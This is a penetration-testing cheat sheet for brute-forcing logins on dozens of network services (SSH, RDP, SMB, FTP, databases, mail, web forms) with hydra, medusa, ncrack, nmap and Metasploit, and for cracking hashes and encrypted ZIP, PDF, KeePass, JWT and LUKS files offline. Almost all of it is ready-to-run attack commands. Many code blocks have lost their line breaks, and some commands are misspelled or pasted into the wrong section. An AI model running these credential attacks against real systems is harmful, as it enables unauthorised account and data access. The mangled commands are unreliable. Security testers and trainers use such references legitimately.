# Brute Force - CheatSheet

**Wait a second, have you tried to use default credentials??**

**Search in google** for default credentials of the technology that is being used, or **try this links**:

* \*\*\*\*[**http://www.phenoelit.org/dpl/dpl.html**](http://www.phenoelit.org/dpl/dpl.html)\*\*\*\*
* \*\*\*\*[**https://192-168-1-1ip.mobi/default-router-passwords-list/**](https://192-168-1-1ip.mobi/default-router-passwords-list/)\*\*\*\*
* \*\*\*\*[**https://datarecovery.com/rd/default-passwords/**](https://datarecovery.com/rd/default-passwords/)\*\*\*\*
* \*\*\*\*[**https://bizuns.com/default-passwords-list**](https://bizuns.com/default-passwords-list)\*\*\*\*
* \*\*\*\*[**https://github.com/danielmiessler/SecLists/blob/master/Passwords/Default-Credentials/default-passwords.csv**](https://github.com/danielmiessler/SecLists/blob/master/Passwords/Default-Credentials/default-passwords.csv)\*\*\*\*
* \*\*\*\*[**https://www.cirt.net/passwords**](https://www.cirt.net/passwords)\*\*\*\*
* \*\*\*\*[**http://www.passwordsdatabase.com/**](http://www.passwordsdatabase.com)

## Service <a href="#service" id="service"></a>

Ordered alphabetically by service name.

### AFP <a href="#afp" id="afp"></a>

```
nmap -p 548 --script afp-brute <IP>msf> use auxiliary/scanner/afp/afp_loginmsf> set BLANK_PASSWORDS truemsf> set USER_AS_PASS truemsf> set PASS_FILE <PATH_PASSWDS>msf> set USER_FILE <PATH_USERS>msf> run
```

### AJP <a href="#ajp" id="ajp"></a>

```
nmap --script ajp-brute -p 8009 <IP>
```

### Cassandra <a href="#cassandra" id="cassandra"></a>

```
nmap --script cassandra-brute -p 9160 <IP>
```

### CouchDB <a href="#couchdb" id="couchdb"></a>

```
msf> use auxiliary/scanner/couchdb/couchdb_login
```

### FTP <a href="#ftp" id="ftp"></a>

```
hydra -l root -P passwords.txt [-t 32] <IP> ftpncrack -p 21 --user root -P passwords.txt <IP> [-T 5]medusa -u root -P 500-worst-passwords.txt -h <IP> -M ftp
```

### HTTP Generic Brute <a href="#http-generic-brute" id="http-generic-brute"></a>

### HTTP Basic Auth <a href="#http-basic-auth" id="http-basic-auth"></a>

```
hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst sizzle.htb.local http-get /certsrv/medusa -h <IP> -u <username> -P  <passwords.txt> -M  http -m DIR:/path/to/auth -T 10
```

### HTTP - Post Form <a href="#http-post-form" id="http-post-form"></a>

```
hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst domain.htb  http-post-form "/path/index.php:name=^USER^&password=^PASS^&enter=Sign+in:Login name or password is incorrect" -V
```

For http**s** you have to change from "http-post-form" to "**https-post-form"**

### **HTTP - CMS --** (W)ordpress, (J)oomla or (D)rupal or (M)oodle <a href="#http-cms-w-ordpress-j-oomla-or-d-rupal-or-m-oodle" id="http-cms-w-ordpress-j-oomla-or-d-rupal-or-m-oodle"></a>

```
cmsmap -f W/J/D/M -u a -p a https://wordpress.com
```

### IMAP <a href="#imap" id="imap"></a>

```
hydra -l USERNAME -P /path/to/passwords.txt -f <IP> imap -Vhydra -S -v -l USERNAME -P /path/to/passwords.txt -s 993 -f <IP> imap -Vnmap -sV --script imap-brute -p <PORT> <IP>
```

### IRC <a href="#irc" id="irc"></a>

```
nmap -sV --script irc-brute,irc-sasl-brute --script-args userdb=/path/users.txt,passdb=/path/pass.txt -p <PORT> <IP>
```

### ISCSI <a href="#iscsi" id="iscsi"></a>

```
nmap -sV --script iscsi-brute --script-args userdb=/var/usernames.txt,passdb=/var/passwords.txt -p 3260 <IP>
```

### LDAP <a href="#ldap" id="ldap"></a>

```
nmap --script ldap-brute -p 389 <IP>
```

### Mongo <a href="#mongo" id="mongo"></a>

```
nmap -sV --script mongodb-brute -n -p 27017 <IP>use auxiliary/scanner/mongodb/mongodb_login
```

### MySQL <a href="#mysql" id="mysql"></a>

```
hydra -L usernames.txt -P pass.txt <IP> mysqlmsf> use auxiliary/scanner/mysql/mysql_login; set VERBOSE false
```

### OracleSQL <a href="#oraclesql" id="oraclesql"></a>

```
patator oracle_login sid=<SID> host=<IP> user=FILE0 password=FILE1 0=users-oracle.txt 1=pass-oracle.txt -x ignore:code=ORA-01017​./odat.py passwordguesser -s $SERVER -d $SID./odat.py passwordguesser -s $MYSERVER -p $PORT --accounts-file accounts_multiple.txt​#msf1msf> use admin/oracle/oracle_loginmsf> set RHOSTS <IP>msf> set RPORT 1521msf> set SID <SID>​#msf2, this option uses nmap and it fails sometimes for some reasonmsf> use scanner/oracle/oracle_loginmsf> set RHOSTS <IP>msf> set RPORTS 1521msf> set SID <SID>​#nmap fails sometimes for some reson executing this scriptnmap --script oracle-brute -p 1521 --script-args oracle-brute.sid=<SID> <IP>
```

In order to use **oracle\_login** with **patator** you need to **install**:

```
pip3 install cx_Oracle --upgrade
```

​[Offline OracleSQL hash bruteforce](https://book.hacktricks.xyz/pentesting/1521-1522-1529-pentesting-oracle-listener/remote-stealth-pass-brute-force#outer-perimeter-remote-stealth-pass-brute-force) (**versions 11.1.0.6, 11.1.0.7, 11.2.0.1, 11.2.0.2,** and **11.2.0.3**):

```
 nmap -p1521 --script oracle-brute-stealth --script-args oracle-brute-stealth.sid=DB11g -n 10.11.21.30
```

### POP <a href="#pop" id="pop"></a>

```
hydra -l USERNAME -P /path/to/passwords.txt -f <IP> pop3 -Vhydra -S -v -l USERNAME -P /path/to/passwords.txt -s 995 -f <IP> pop3 -V
```

### PostgreSQL <a href="#postgresql" id="postgresql"></a>

```
hydra -L /root/Desktop/user.txt –P /root/Desktop/pass.txt <IP> postgresmedusa -h <IP> –U /root/Desktop/user.txt –P /root/Desktop/pass.txt –M postgresncrack –v –U /root/Desktop/user.txt –P /root/Desktop/pass.txt <IP>:5432patator pgsql_login host=<IP> user=FILE0 0=/root/Desktop/user.txt password=FILE1 1=/root/Desktop/pass.txtuse auxiliary/scanner/postgres/postgres_loginnmap -sV --script pgsql-brute --script-args userdb=/var/usernames.txt,passdb=/var/passwords.txt -p 5432 <IP>
```

### PPTP <a href="#pptp" id="pptp"></a>

```
cat rockyou.txt | thc-pptp-bruter –u <Username> <IP>
```

### RDP <a href="#rdp" id="rdp"></a>

```
ncrack -vv --user <User> -P pwds.txt rdp://<IP>hydra -V -f -L <userslist> -P <passwlist> rdp://<IP>
```

### Redis <a href="#redis" id="redis"></a>

```
msf> use auxiliary/scanner/redis/redis_loginnmap --script redis-brute -p 6379 <IP>hydra –P /path/pass.txt <IP> redis
```

### Rexec <a href="#rexec" id="rexec"></a>

```
hydra -l <username> -P <password_file> rexec://<Victim-IP> -v -V
```

### Rlogin <a href="#rlogin" id="rlogin"></a>

```
hydra -l <username> -P <password_file> rlogin://<Victim-IP> -v -V
```

### Rsh <a href="#rsh" id="rsh"></a>

```
hydra -L <Username_list> rsh://<Victim_IP> -v -V
```

​[http://pentestmonkey.net/tools/misc/rsh-grind](http://pentestmonkey.net/tools/misc/rsh-grind)​

### Rsync <a href="#rsync" id="rsync"></a>

```
nmap -sV --script rsync-brute --script-args userdb=/var/usernames.txt,passdb=/var/passwords.txt -p 873 <IP>
```

### RTSP <a href="#rtsp" id="rtsp"></a>

```
hydra -l root -P passwords.txt <IP> rtsp
```

### SNMP <a href="#snmp" id="snmp"></a>

```
msf> use auxiliary/scanner/snmp/snmp_loginnmap -sU --script snmp-brute <target> [--script-args snmp-brute.communitiesdb=<wordlist> ]onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp_onesixtyone.txt <IP>hydra -P /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt target.com snmp
```

### SMB <a href="#smb" id="smb"></a>

```
nmap --script smb-brute -p 445 <IP>hydra -l Administrator -P words.txt 192.168.1.12 smb -t 1
```

### SMTP <a href="#smtp" id="smtp"></a>

```
hydra -l <username> -P /path/to/passwords.txt <IP> smtp -Vhydra -l <username> -P /path/to/passwords.txt -s 587 <IP> -S -v -V #Port 587 for SMTP with SSL
```

### SQL Server <a href="#sql-server" id="sql-server"></a>

```
#Use the NetBIOS name of the machine as domainhydra -L /root/Desktop/user.txt –P /root/Desktop/pass.txt <IP> mssqlmedusa -h <IP> –U /root/Desktop/user.txt –P /root/Desktop/pass.txt –M mssqlnmap -p 1433 --script ms-sql-brute --script-args mssql.domain=DOMAIN,userdb=customuser.txt,passdb=custompass.txt,ms-sql-brute.brute-windows-accounts <host> #Use domain if needed. Be carefull with the number of password in the list, this could block accountsmsf> use auxiliary/scanner/mssql/mssql_login #Be carefull, you can block accounts. If you have a domain set it and use USE_WINDOWS_ATHENT
```

### SSH <a href="#ssh" id="ssh"></a>

```
hydra -l root -P passwords.txt [-t 32] <IP> sshncrack -p 22 --user root -P passwords.txt <IP> [-T 5]medusa -u root -P 500-worst-passwords.txt -h <IP> -M ssh
```

### Telnet <a href="#telnet" id="telnet"></a>

```
hydra -l root -P passwords.txt [-t 32] <IP> telnetncrack -p 23 --user root -P passwords.txt <IP> [-T 5]medusa -u root -P 500-worst-passwords.txt -h <IP> -M telnet
```

### VNC <a href="#vnc" id="vnc"></a>

```
hydra -L /root/Desktop/user.txt –P /root/Desktop/pass.txt -s <PORT> <IP> vncmedusa -h <IP> –u root -P /root/Desktop/pass.txt –M vncncrack -V --user root -P /root/Desktop/pass.txt <IP>:>POR>Tpatator vnc_login host=<IP> password=FILE0 0=/root/Desktop/pass.txt –t 1 –x retry:fgep!='Authentication failure' --max-retries 0 –x quit:code=0use auxiliary/scanner/vnc/vnc_loginnmap -sV --script pgsql-brute --script-args userdb=/var/usernames.txt,passdb=/var/passwords.txt -p 5432 <IP>
```

## Local <a href="#local" id="local"></a>

### Online cracking databases <a href="#online-cracking-databases" id="online-cracking-databases"></a>

*
  * ​[https://www.onlinehashcrack.com/](https://www.onlinehashcrack.com) (Hashes, WPA2 captures, and archives MSOffice, ZIP, PDF...)
*
  *
    * ​[https://gpuhash.me/](https://gpuhash.me) (Hashes and file hashes)
*
  *
    * ​[https://hashkiller.co.uk/Cracker](https://hashkiller.co.uk/Cracker) (MD5, NTLM, SHA1, MySQL5, SHA256, SHA512)
*

Check this out before trying to bruteforce a Hash.

### Generic <a href="#generic" id="generic"></a>

#### Hash-identifier <a href="#hash-identifier-1" id="hash-identifier-1"></a>

### John <a href="#john" id="john"></a>

```
john --rule --wordlist=/usr/share/wordlists/rockyou.txt file_with_hash.txt
```

#### unshadow <a href="#unshadow" id="unshadow"></a>

```
unshadow passwd.txt shadow.txt > tojohn.txt
```

### ZIP <a href="#zip" id="zip"></a>

```
fcrackzip -u -D -p '/usr/share/wordlists/rockyou.txt' chall.zip
```

```
zip2john file.zip > zip.johnjohn zip.john
```

### 7z <a href="#7z" id="7z"></a>

```
cat /usr/share/wordlists/rockyou.txt | 7za t backup.7z
```

```
#Download and install requirements for 7z2johnwget https://raw.githubusercontent.com/magnumripper/JohnTheRipper/bleeding-jumbo/run/7z2john.plapt-get install libcompress-raw-lzma-perl./7z2john.pl file.7z > 7zhash.john
```

### PDF <a href="#pdf" id="pdf"></a>

```
apt-get install pdfcrackpdfcrack encrypted.pdf -w /usr/share/wordlists/rockyou.txt#pdf2john didnt worked well, john didnt know which hash type was# To permanently decrypt the pdfsudo apt-get install qpdfqpdf --password=<PASSWORD> --decrypt encrypted.pdf plaintext.pdf
```

### JWT <a href="#jwt" id="jwt"></a>

```
git clone https://github.com/Sjord/jwtcrack.gitcd jwtcrack​#Bruteforce using crackjwt.pypython crackjwt.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcImFkbWluXCIsXCJyb2xlXCI6XCJhZG1pblwifSJ9.8R-KVuXe66y_DXVOVgrEqZEoadjBnpZMNbLGhM8YdAc /usr/share/wordlists/rockyou.txt​#Bruteforce using johnpython jwt2john.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcImFkbWluXCIsXCJyb2xlXCI6XCJhZG1pblwifSJ9.8R-KVuXe66y_DXVOVgrEqZEoadjBnpZMNbLGhM8YdAc > jwt.johnjohn jwt.john #It does not work with Kali-John
```

### NTLM cracking <a href="#ntlm-cracking" id="ntlm-cracking"></a>

```
Format:USUARIO:ID:HASH_LM:HASH_NT:::jhon --wordlist=/usr/share/wordlists/rockyou.txt --fomrat=NT file_NTLM.hasheshashcat -a 0 -m 1000 --username file_NTLM.hashes /usr/share/wordlists/rockyou.txt --potfile-path salida_NT.pot
```

### Keepass <a href="#keepass" id="keepass"></a>

```
sudo apt-get install -y kpcli #Install keepass tools like keepass2johnkeepass2john file.kdbx > hash #The keepass is only using passwordkeepass2john -k <file-password> file.kdbx > hash # The keepas is also using a file as a needed credential#The keepass can use password and/or a file as credentials, if it is using both you need to provide them to keepass2johnjohn --wordlist=/usr/share/wordlists/rockyou.txt hash
```

### Lucks image <a href="#lucks-image" id="lucks-image"></a>

#### Method 1 <a href="#method-1" id="method-1"></a>

Install: [https://github.com/glv2/bruteforce-luks](https://github.com/glv2/bruteforce-luks)​

```
bruteforce-luks -f ./list.txt ./backup.imgcryptsetup luksOpen backup.img mylucksopenls /dev/mapper/ #You should find here the image mylucksopenmount /dev/mapper/mylucksopen /mnt
```

#### Method 2 <a href="#method-2" id="method-2"></a>

```
cryptsetup luksDump backup.img #Check that the payload offset is set to 4096dd if=backup.img of=luckshash bs=512 count=4097 #Payload offset +1hashcat -m 14600 luckshash cryptsetup luksOpen backup.img mylucksopenls /dev/mapper/ #You should find here the image mylucksopenmount /dev/mapper/mylucksopen /mnt
```

### Mysql <a href="#mysql-1" id="mysql-1"></a>

```
#John hash format<USERNAME>:$mysqlna$<CHALLENGE>*<RESPONSE>dbuser:$mysqlna$112233445566778899aabbccddeeff1122334455*73def07da6fba5dcc1b19c918dbd998e0d1f3f9d
```

**Hash examples:** [https://openwall.info/wiki/john/sample-hashes](https://openwall.info/wiki/john/sample-hashes)​

### Hash-identifier <a href="#hash-identifier" id="hash-identifier"></a>

### Crunch <a href="#crunch" id="crunch"></a>

```
crunch 4 6 0123456789ABCDEF -o crunch1.txt #From length 4 to 6 using that alphabetcrunch 4 4 -f /usr/share/crunch/charset.lst mixalpha # Only length 4 using charset mixalpha (inside file charset.lst)​@ Lower case alpha characters, Upper case alpha characters% Numeric characters^ Special characters including spaccrunch 6 8 -t ,@@^^%%
```

### Cewl <a href="#cewl" id="cewl"></a>

```
cewl --with-numbers -d 2 -m 5 -w words.txt http://$ip/
```

### John mutation <a href="#john-mutation" id="john-mutation"></a>

Read _**/etc/john/john.conf**_ and configure it

```
john --wordlist=words.txt --rules --stdout > w_mutated.txtjohn --wordlist=words.txt --rules=all --stdout > w_mutated.txt #Apply all rules
```

### Hashcat <a href="#hashcat" id="hashcat"></a>

```
hashcat --example-hashes | grep -B1 -A2 "NTLM"
```

Cracking Linux Hashes - /etc/shadow file

```
 500 | md5crypt $1$, MD5(Unix)                          | Operating-Systems3200 | bcrypt $2*$, Blowfish(Unix)                      | Operating-Systems7400 | sha256crypt $5$, SHA256(Unix)                    | Operating-Systems1800 | sha512crypt $6$, SHA512(Unix)                    | Operating-Systems
```

Cracking Windows Hashes

```
3000 | LM                                               | Operating-Systems1000 | NTLM                                             | Operating-Systems
```

Cracking Common Application Hashes

```
  900 | MD4                                              | Raw Hash    0 | MD5                                              | Raw Hash 5100 | Half MD5                                         | Raw Hash  100 | SHA1                                             | Raw Hash10800 | SHA-384                                          | Raw Hash 1400 | SHA-256                                          | Raw Hash 1700 | SHA-512                                          | Raw Hash
```

​
